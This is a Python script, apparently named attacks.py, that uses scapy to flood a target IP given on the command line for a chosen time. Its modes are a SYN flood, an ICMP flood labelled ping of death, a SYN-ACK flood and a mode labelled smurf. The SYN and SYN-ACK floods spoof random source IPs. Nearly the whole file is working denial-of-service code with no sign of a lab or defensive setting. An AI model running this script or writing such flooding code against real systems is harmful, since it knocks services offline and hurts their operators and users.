from scapy.all import *
import random
import sys
import time


def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def ddos(target_ip, attack_type, duration):
    target_port = 12345
    end_time = time.time() + duration

    if attack_type == "syn_flood":
        while time.time() < end_time:
            src_port = random.randint(1024, 65535)
            src_ip = generate_random_ip()
            ammount = random.randint(1, 100)
            for _ in range(ammount):
                pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
                send(pkt, verbose=0)
                # print(pkt)
    elif attack_type == "pod":
        while time.time() < end_time:
            load = 1000
            src_ip = generate_random_ip()
            ammount = random.randint(1, 100)
            for _ in range(ammount):
                pkt = IP(src=src_ip, dst=target_ip) / ICMP() / Raw(load="A" * load)
                send(pkt, verbose=0)
                # print(pkt)
    elif attack_type == "syn_ack":
        while time.time() < end_time:
            src_port = random.randint(1024, 65535)
            src_ip = generate_random_ip()
            ammount = random.randint(1, 100)
            for _ in range(ammount):
                pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")
                send(pkt, verbose=0)
                # print(pkt)
    elif attack_type == "smurf":
        while time.time() < end_time:
            pkt = IP(src=target_ip, dst=target_ip) / ICMP()
            send(pkt, verbose=0)
            # print(pkt)
    else:
        print("Invalid attack type specified.")
        return

    print(f"Attack '{attack_type}' on {target_ip} finished.")


if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python attacks.py <target_ip> <attack_type> <duration>")
        print("Attack types: syn_flood, pod, syn_ack, smurf")
        sys.exit(1)

    target_ip = sys.argv[1]
    attack_type = sys.argv[2]
    duration = int(sys.argv[3])
    print(f"Starting {attack_type} attack on {target_ip} for {duration} seconds...")

    ddos(target_ip, attack_type, duration)
